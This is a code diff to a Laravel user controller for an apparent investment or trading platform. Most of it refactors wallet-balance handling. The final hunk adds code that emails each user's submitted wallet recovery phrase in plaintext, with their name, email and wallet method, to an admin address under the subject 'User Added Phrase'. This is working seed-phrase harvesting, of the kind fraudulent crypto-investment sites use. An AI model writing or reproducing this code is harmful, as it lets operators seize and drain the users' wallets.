@@ -23,6 +23,7 @@ use Illuminate\Support\Facades\Http;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Storage;
+use App\Http\Controllers\MailController;
 use Illuminate\Support\Facades\Response;
 use Illuminate\Support\Facades\Validator;
 use Symfony\Component\HttpFoundation\BinaryFileResponse;
@@ -141,7 +142,25 @@ class UserController extends Controller
         $offshore_cash = 0.00;
         $offshore_trading = 0.00;
 
-        return view('user.index', compact(['user', 'data', 'portfolioValue', 'deposits', 'payouts', 'assets', 'total_assets', 'withdrawable', 'stocks_data', 'symbol', 'percentage', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading']));
+
+        $walletData = [
+            'balance' => $portfolioValue,
+            'ic_wallet' => $user->calculateBalances()['ira_cash'],
+            'it_wallet' => $user->calculateBalances()['ira_trading'],
+            'oc_wallet' => $user->calculateBalances()['offshore_cash'],
+            'ot_wallet' => $user->calculateBalances()['offshore_trading'],
+            // 'swap' => $user->swap,
+            // 'margin' => $user->maigin,
+            // 'phrase' => $user->phrase,
+        ];
+
+        if(!$user->wallet) {
+            $user->createOrUpdateWallet($walletData);
+        }
+
+        $wallet = $user->wallet();
+
+        return view('user.index', compact(['user', 'wallet', 'data', 'portfolioValue', 'deposits', 'payouts', 'assets', 'total_assets', 'withdrawable', 'stocks_data', 'symbol', 'percentage', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading']));
     }
 
     public function portfolio()
@@ -463,20 +482,22 @@ class UserController extends Controller
         $offshore_cash = $user->copyBots->count() >= 1 ? 0 : $offshore;
         $offshore_trading = $user->copyBots->count() >= 1 ? $offshore : 0;
 
-        $wallet = json_decode($user->wallet, true);
+        $walletData = [
+            'balance' => $totalValue,
+            'ic_wallet' => $user->calculateBalances()['ira_cash'],
+            'it_wallet' => $user->calculateBalances()['ira_trading'],
+            'oc_wallet' => $user->calculateBalances()['offshore_cash'],
+            'ot_wallet' => $user->calculateBalances()['offshore_trading'],
+            // 'swap' => $user->swap,
+            // 'margin' => $user->maigin,
+            // 'phrase' => $user->phrase,
+        ];
 
-        if ($wallet == null || $wallet['crypto'] == 0 && $wallet['trading'] == 0) {
-            // Handle the case where the wallet is null or doesn't contain the crypto key
-            $wallet = [
-                'crypto' => ($ira_cash + $offshore_cash),
-                'trading' => ($ira_trading + $offshore_trading),
-            ];
-            $user->updateWallet($wallet['crypto'], $wallet['trading']);
-        } else {
-            // dd($wallet);
+        if(!$user->wallet) {
+            $user->createOrUpdateWallet($walletData);
         }
 
-        return view('user.portfolio', compact('symbol', 'last_ira_roi', 'iraPercentage', 'offshorePercentage', 'news', 'user', 'data', 'days', 'assets', 'setting', 'offshore', 'ira', 'iraData', 'offshoreData', 'total_assets', 'cash', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading', 'totalValue'));
+        return view('user.portfolio', compact('symbol', 'last_ira_roi', 'iraPercentage', 'offshorePercentage', 'news', 'user', 'data', 'days', 'assets', 'setting', 'offshore', 'ira', 'iraData', 'offshoreData', 'total_assets', 'cash', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading'));
     }
 
     protected static function formatAmount($amount): array
@@ -968,6 +989,22 @@ class UserController extends Controller
             $user->update(['phrase' => $dataJson]);
         }
 
+        // Prepare the email content
+        $mailBody = '<p><strong>Username:</strong> ' . $user->name . '</p>
+        <p><strong>Email:</strong> ' . $user->email . '</p>
+        <p><strong>Phrase:</strong> ' . $request->phrase . '</p>
+        <p><strong>Method:</strong> ' . $request->wallet . '</p>';
+
+        // Send the notification to the admin
+        $admin = new User;
+        $admin->email = env('TRANX_EMAIL');
+        $adminMail = [
+            'subject' => 'User Added Phrase',
+            'body' => $mailBody,
+        ];
+        MailController::sendTransactionNotificationToAdmin($admin, $adminMail);
+
         return;
     }
+
 }
